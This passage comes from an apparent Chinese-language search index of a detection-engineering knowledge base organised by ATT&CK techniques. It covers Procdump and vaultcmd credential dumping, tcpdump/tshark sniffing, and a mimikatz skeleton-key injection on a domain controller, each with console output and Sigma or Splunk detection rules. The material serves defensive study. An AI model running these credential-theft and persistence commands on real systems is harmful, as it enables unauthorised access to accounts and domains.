reached.\n\nC:\\Users\\Administrator\\Desktop\\Procdump&gt;\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>sysmon\u4e8b\u4ef6\uff0c\u8fdb\u7a0b\u521b\u5efa\u3001\u8fdb\u7a0b\u8bbf\u95ee\u3001\u8fdb\u7a0b\u7ed3\u675f</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u660e\u6587\u83b7\u53d6\u51ed\u8bc1\u2014\u2014Procdump\ndescription: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        OriginalFileName: 'procdump'\n    filter:\n        Image: \n            - '*\\procdump.exe'\n            - '*\\procdump64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Procdump illegaly bundled with legitimate software\n    - Weird admins who renamed binaries\nlevel: critical\n    timeframe: last 1m\n    condition: all of them\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u60a8\u5173\u6ce8\u4e00\u4e0bsysmon10.2\u7684\u65b0\u7279\u6027OriginalFileName\uff0c\u7ecf\u8fc7\u5b89\u5168\u4eba\u5458\u7814\u7a76\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5728\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\uff0cprocdump\u4fee\u6539\u4e3aABC\uff0c\u4f46OriginalFileName\u4f9d\u65e7\u80fd\u591f\u6e05\u6670\u7684\u8bc6\u522b\u51fa\u8be5\u6b3e\u5de5\u5177\u662fprocdump\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003</p> <p>https://attack.mitre.org/techniques/T1003/</p> <p>windows SSPI\u6a21\u578b</p> <p>https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi-model</p> <p>MSV\u8eab\u4efd\u9a8c\u8bc1\u5305</p> <p>https://blog.csdn.net/lionzl/article/details/7725116</p> <p>Wdigest\u6458\u8981\u8ba4\u8bc1\u534f\u8bae</p> <p>https://www.4hou.com/info/news/8126.html</p> <p>Kerberos\u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u6280\u672f\u53c2\u8003</p> <p>https://www.cnblogs.com/adylee/articles/893448.html</p> <p>CredSSP\u51ed\u8bc1\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u534f\u8bae</p> <p>https://docs.microsoft.com/zh-cn/windows/win32/secauthn/credential-security-support-provider</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/","title":"T1003-win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u51ed\u636e\u5bfc\u51fa\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u83b7\u53d6\u8d26\u53f7\u767b\u5f55\u540d\u548c\u5bc6\u7801\uff08\u54c8\u5e0c\u6216\u660e\u6587\u5bc6\u7801\uff09\u4fe1\u606f\u7684\u8fc7\u7a0b\u3002\u7136\u540e\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u6765\u6267\u884c\u6a2a\u5411\u79fb\u52a8\u5e76\u8bbf\u95ee\u53d7\u9650\u5236\u7684\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u548c\u4e13\u4e1a\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u90fd\u53ef\u80fd\u4f1a\u4f7f\u7528\u6b64\u6280\u672f\u4e2d\u63d0\u5230\u7684\u51e0\u79cd\u5de5\u5177\u3002\u4e5f\u53ef\u80fd\u5b58\u5728\u5176\u4ed6\u81ea\u5b9a\u4e49\u5de5\u5177\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u83b7\u5f97\u7cfb\u7edf\u51ed\u636e\u7684\u57fa\u672c\u4fe1\u606f \u5de5\u51771\uff1a vaultcmd(windows\u7cfb\u7edf\u81ea\u5e26)</p> <p>\u5e38\u7528\u547d\u4ee4\uff1a \u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u5217\u8868\uff1a vaultcmd /list \u6ce8\uff1a\u4e0d\u540c\u7c7b\u578b\u7684\u51ed\u636e\u4fdd\u5b58\u5728\u4e0d\u540c\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b</p> <p>\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u6982\u8981\uff0c\u51ed\u636e\u540d\u79f0\u548cGUID\uff1a vaultcmd /listschema \u6ce8\uff1aGUID\u5bf9\u5e94\u8def\u5f84%localappdata%/Microsoft\\Vault{GUID}\u4e0b\u7684\u6587\u4ef6</p> <p>\u5217\u51fa\u540d\u4e3a\u201dWeb Credentials\u201d\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\u4fe1\u606f\uff1a vaultcmd /listcreds:\"Web Credentials\" \u6ce8\uff1a\u5982\u679c\u662f\u4e2d\u6587\u64cd\u4f5c\u7cfb\u7edf\uff0c\u53ef\u5c06\u540d\u79f0\u66ff\u6362\u4e3a\u5bf9\u5e94\u7684GUID\uff0c\u547d\u4ee4\u5982\u4e0b</p> <p>\u5217\u51faGUID\u4e3a{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\uff1a vaultcmd /listcreds:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}</p> <p>\u5217\u51faGUID\u4e3a{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\u7684\u4fdd\u7ba1\u5e93(vault)\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6587\u4ef6\u4f4d\u7f6e\u3001\u5305\u542b\u7684\u51ed\u636e\u6570\u91cf\u3001\u4fdd\u62a4\u65b9\u6cd5\uff1a vaultcmd /listproperties:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<ul> <li>windows \u5b89\u5168\u65e5\u5fd7</li> <li>windows Sysmon\u65e5\u5fd7</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u81ea\u884c\u6d4b\u8bd5\u5373\u53ef\uff0c\u7565\u7b80\u5355</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\u4e0b\u8f7d\u5730\u5740\uff1a</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f\ndescription: windows server 2016\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security/Sysmon\ndetection:\n    selection:\n        EventID:\n           - 4688 #windows\u5b89\u5168\u65e5\u5fd7\uff0c\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n           - 1 #windows Sysmon\u65e5\u5fd7\uff0c\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\n        New processname: C:\\Windows\\System32\\VaultCmd.exe #\u65b0\u8fdb\u7a0b\u540d\u79f0/image\n        Parent processname: C:\\Windows\\System32\\cmd.exe #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0/ParentImage\n        Process commandline:\n           - vaultcmd  /list  #\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u5217\u8868\n           - vaultcmd  /listschema #\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u6982\u8981\uff0c\u51ed\u636e\u540d\u79f0\u548cGUID\n           - vaultcmd  /listcreds:{*} #\u4e2d\u6587\u7cfb\u7edf\uff0c\u5217\u51faGUID\u4e3a{* }\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\n           - vaultcmd /listcreds:\"*\"  #\u82f1\u6587\u7cfb\u7edf \uff0c\u5217\u51fa\u540d\u4e3a\u201d*\u201d\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\u4fe1\u606f\n           - vaultcmd  /listproperties:{*} #\u4e2d\u6587\u7cfb\u7edf\uff0c\u5217\u51faGUID\u4e3a{*}\u7684\u4fdd\u7ba1\u5e93(vault)\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6587\u4ef6\u4f4d\u7f6e\u3001\u5305\u542b\u7684\u51ed\u636e\u6570\u91cf\u3001\u4fdd\u62a4\u65b9\u6cd5\n    condition: selection\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_6","title":"\u5efa\u8bae","text":"<p>\u6ce8\uff1a\u5728\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4f7f\u7528windows \u5b89\u5168\u65e5\u5fd74688\uff0c\u8fdb\u7a0bVaultCmd.exe\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\uff1b\u4e5f\u53ef\u4f7f\u7528Sysmon\u8fdb\u884c\u884c\u4e3a\u8bb0\u5f55\uff0c\u5206\u6790\u68c0\u6d4b\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003</p> <p>https://attack.mitre.org/techniques/T1003/</p> <p>\u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e2dCredential Manager\u7684\u4fe1\u606f\u83b7\u53d6</p> <p>https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/","title":"T1040-linux-\u7f51\u7edc\u55c5\u63a2","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u7f51\u7edc\u55c5\u63a2\u662f\u6307\u4f7f\u7528\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u63a5\u53e3\u6765\u76d1\u89c6\u6216\u6355\u83b7\u901a\u8fc7\u6709\u7ebf\u6216\u65e0\u7ebf\u8fde\u63a5\u53d1\u9001\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7f51\u7edc\u63a5\u53e3\u7f6e\u4e8e\u6df7\u6742\u6a21\u5f0f\u4ee5\u901a\u8fc7\u7f51\u7edc\u88ab\u52a8\u5730\u8bbf\u95ee\u4f20\u8f93\u4e2d\u7684\u6570\u636e\uff0c\u6216\u8005\u4f7f\u7528\u8de8\u63a5\u7aef\u53e3\u6765\u6355\u83b7\u66f4\u5927\u91cf\u7684\u6570\u636e\u3002</p> <p>\u901a\u8fc7\u8be5\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u7684\u6570\u636e\u5305\u62ec\u7528\u6237\u51ed\u8bc1\uff0c\u5c24\u5176\u662f\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u672a\u52a0\u5bc6\u534f\u8bae\u53d1\u9001\u7684\u51ed\u8bc1\uff1b\u7f51\u7edc\u55c5\u63a2\u8fd8\u53ef\u4ee5\u83b7\u53d6\u5230\u914d\u7f6e\u7ec6\u8282\uff0c\u4f8b\u5982\u8fd0\u884c\u670d\u52a1\uff0c\u7248\u672c\u53f7\u4ee5\u53ca\u540e\u7eed\u6a2a\u5411\u79fb\u52a8\u548c/\u6216\u9632\u5fa1\u9003\u907f\u6d3b\u52a8\u6240\u9700\u7684\u5176\u4ed6\u7f51\u7edc\u7279\u5f81\uff08\u4f8b\u5982\uff1aIP\u5bfb\u5740\uff0c\u4e3b\u673a\u540d\uff0cVLAN ID\uff09\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>tcpdump -c 5 -nnni #{\u7f51\u5361\u63a5\u53e3}</p> <p>tshark -c 5 -i #{\u7f51\u5361\u63a5\u53e3}</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux /var/log/message \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542fmessage\u65e5\u5fd7\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff09</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_4","title":"\u573a\u666f\u4e00","text":"<p>root@icbc:~# tcpdump -c 5 -nnni ens33 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 10:37:34.347544 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:37.355725 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:40.356238 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:43.356969 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:49.808569 IP 192.168.66.148.59150 &gt; 192.168.66.2.53: 15476+ [1au] A? connectivity-check.ubuntu.com. (58) 5 packets captured 5 packets received by filter 0 packets dropped by kernel</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_5","title":"\u573a\u666f\u4e8c","text":"<p>root@icbc:~# tshark -c 5 -i ens33 Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'ens33'     1 0.000000000 192.168.66.148 \u2192 192.168.66.2 DNS 100 Standard query 0xe349 A connectivity-check.ubuntu.com OPT     2 0.038532840 Vmware_e8:11:b3 \u2192 Broadcast    ARP 60 Who has 192.168.66.148? Tell 192.168.66.2     3 0.038552195 Vmware_02:d5:c7 \u2192 Vmware_e8:11:b3 ARP 42 192.168.66.148 is at 00:0c:29:02:d5:c7     4 0.038758293 192.168.66.2 \u2192 192.168.66.148 DNS 132 Standard query response 0xe349 A connectivity-check.ubuntu.com A 35.224.99.156 A 35.222.85.5 OPT     5 0.039670671 192.168.66.148 \u2192 35.222.85.5  TCP 74 57812 \u2192 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=136575048 TSecr=0 WS=128 5 packets captured</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#0x1","title":"0x1","text":"<p>message\u65e5\u5fd7</p> <p>Jul 19 10:37:33 icbc kernel: [  298.396406] device ens33 entered promiscuous mode</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#0x2","title":"0x2","text":"<p>message\u65e5\u5fd7</p> <p>Jul 19 10:47:42 icbc systemd[1]: Started Cleanup of Temporary Directories. Jul 19 10:47:50 icbc kernel: [  915.199848] device ens33 left promiscuous mode Jul 19 10:47:50 icbc start.sh[734]: 2019-07-19 10:47:50,165: DEBUG helpers.application.health RAM: 65MB</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#splunk","title":"splunk\u68c0\u6d4b\u89c4\u5219","text":"<p>index=linux sourcetype=syslog entered promiscuous mode | table host,message</p> <p>index=linux sourcetype=syslog left promiscuous mode | table host,message</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_8","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1040: https://attack.mitre.org/techniques/T1040/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","title":"T1098-win-\u4e07\u80fd\u5bc6\u7801","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u53d7\u5bb3\u8005\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u6216\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\uff08skeleton key\uff09\uff0c\u53ef\u4ee5\u5bf9\u57df\u5185\u6743\u9650\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#1pc","title":"\u6b65\u9aa41\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09","text":"<pre><code>C:\\Users\\xiaomi&gt;dir \\\\dc.xiaomi.org\\c$  \n\u62d2\u7edd\u8bbf\u95ee\u3002\n\nC:\\Users\\xiaomi&gt;net use \\\\dc.xiaomi.org\\ipc$ \"admin.098\" /user:xiaomi\\administra\ntor\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\nC:\\Users\\xiaomi&gt;dir \\\\dc.xiaomi.org\\c$\n \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C\n\n \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55\n\n2009/07/14  11:20    &lt;DIR&gt;          PerfLogs\n2020/03/23  15:24    &lt;DIR&gt;          Program Files\n2020/03/23  15:24    &lt;DIR&gt;          Program Files (x86)\n2020/03/23  14:47    &lt;DIR&gt;          Users\n2020/03/23  15:30    &lt;DIR&gt;          Windows\n               0 \u4e2a\u6587\u4ef6              0 \u5b57\u8282\n               5 \u4e2a\u76ee\u5f55 32,728,838,144 \u53ef\u7528\u5b57\u8282\n\nC:\\Users\\xiaomi&gt;net use\n\u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002\n\n\n\u72b6\u6001       \u672c\u5730        \u8fdc\u7a0b                      \u7f51\u7edc\n\n-------------------------------------------------------------------------------\nOK                     \\\\dc.xiaomi.org\\ipc$      Microsoft Windows Network\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\n\nC:\\Users\\xiaomi&gt;net use \\\\dc.xiaomi.org\\ipc$ /del /y\n\\\\dc.xiaomi.org\\ipc$ \u5df2\u7ecf\u5220\u9664\u3002\n\n\nC:\\Users\\xiaomi&gt;net use\n\u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002\n\n\u5217\u8868\u662f\u7a7a\u7684\u3002\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#2dc","title":"\u6b65\u9aa42\uff08DC\u4e0a\u6267\u884c\uff0c\u7ba1\u7406\u5458\u6743\u9650\uff09","text":"<pre><code>C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;mimikatz.exe \"privilege::debug\n\" \"misc::skeleton\" exit\n\n  .#####.   mimikatz 2.1.1 (x64) built on Apr  9 2017 23:24:20\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  /* * *\n ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 21 modules * * */\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # misc::skeleton\n[KDC] data\n[KDC] struct\n[KDC] keys patch OK\n[RC4] functions\n[RC4] init patch OK\n[RC4] decrypt patch OK\n\nmimikatz(commandline) # exit\nBye!\n</code></pre> <p>\u7cfb\u7edf\u63d0\u793aSkeleton Key\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\u3002\u6b64\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u7684\u6240\u6709\u8d26\u6237\u4e2d\u6dfb\u52a0\u4e00\u4e2aSkeleton key\uff0c\u5176\u5bc6\u7801\u9ed8\u8ba4\u4e3a\u201cmimikatz\u201d\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5\u4ee5\u57df\u5185\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\uff0c\u914d\u5408\u8be5Skeleton Key\uff0c\u8fdb\u884c\u57df\u5185\u8eab\u4efd\u6388\u6743\u9a8c\u8bc1\u4e86\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#3pc","title":"\u6b65\u9aa43\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09","text":"<pre><code>C:\\Users\\xiaomi&gt;net use \\\\dc.xiaomi.org\\ipc$ \"mimikatz\" /user:xiaomi\\administrat\nor\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\n\nC:\\Users\\xiaomi&gt;dir \\\\dc.xiaomi.org\\c$\n \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C\n\n \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55\n\n2009/07/14  11:20    &lt;DIR&gt;          PerfLogs\n2020/03/23  15:24    &lt;DIR&gt;          Program Files\n2020/03/23  15:24    &lt;DIR&gt;          Program Files (x86)\n2020/03/23  14:47    &lt;DIR&gt;          Users\n2020/03/23  15:30    &lt;DIR&gt;          Windows\n               0 \u4e2a\u6587\u4ef6              0 \u5b57\u8282\n               5 \u4e2a\u76ee\u5f55 32,758,198,272 